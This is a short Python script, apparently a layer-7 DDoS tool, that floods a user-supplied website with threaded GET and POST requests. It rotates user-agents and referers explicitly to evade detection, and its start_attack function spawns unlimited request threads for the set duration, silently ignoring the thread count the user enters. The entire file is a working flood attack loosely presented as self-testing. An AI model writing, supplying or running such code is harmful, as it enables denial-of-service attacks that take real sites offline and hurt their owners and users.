import requests
import threading
import random
import time
import sys
from urllib.parse import urljoin

# Prompt user for website URL, number of threads, and test duration
TARGET_URL = input("Enter your website URL (e.g., https://yourwebsite.com): ")
NUM_THREADS = int(input("Enter number of threads: "))
TEST_DURATION = int(input("Enter test duration in seconds: "))

# List of random user-agents, referers, and other headers to make the requests more undetectable
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.wikipedia.org/",
    "https://www.reddit.com/"
]

# Random data for POST requests (you can expand this to match your forms)
POST_DATA = {
    "username": "testuser",
    "password": "password123"
}

# Function to simulate GET request
def send_get_request():
    while True:
        try:
            # Add random query parameters to mimic user traffic
            url = urljoin(TARGET_URL, "/page") + f"?param={random.randint(1, 1000)}"
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Referer": random.choice(REFERERS),
                "Connection": "keep-alive",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
            }
            response = requests.get(url, headers=headers, timeout=5)
            print(f"GET Request to {url} - Status: {response.status_code}")
        except Exception as e:
            print(f"Error with GET request: {e}")
        time.sleep(random.uniform(0.05, 0.1))  # Simulate real user delay

# Function to simulate POST request
def send_post_request():
    while True:
        try:
            # Add random query parameters to mimic user traffic
            url = urljoin(TARGET_URL, "/submit_form")
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Referer": random.choice(REFERERS),
                "Connection": "keep-alive",
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
            }
            response = requests.post(url, data=POST_DATA, headers=headers, timeout=5)
            print(f"POST Request to {url} - Status: {response.status_code}")
        except Exception as e:
            print(f"Error with POST request: {e}")
        time.sleep(random.uniform(0.05, 0.1))  # Simulate real user delay

# Function to start multiple threads for concurrent requests
def start_attack():
    start_time = time.time()

    # Start threads until the duration is reached
    while time.time() - start_time < TEST_DURATION:
        thread = threading.Thread(target=random.choice([send_get_request, send_post_request]))
        thread.daemon = True  # Daemon thread will stop when the main program ends
        thread.start()

    # Keep the script running until the test duration has passed
    while True:
        time.sleep(1)
        if time.time() - start_time >= TEST_DURATION:
            print(f"Test duration of {TEST_DURATION} seconds is complete.")
            break

# Main function to start testing
if __name__ == "__main__":
    print(f"Starting Layer 7 DDoS Simulation against {TARGET_URL} with {NUM_THREADS} threads for {TEST_DURATION} seconds.")
    start_attack()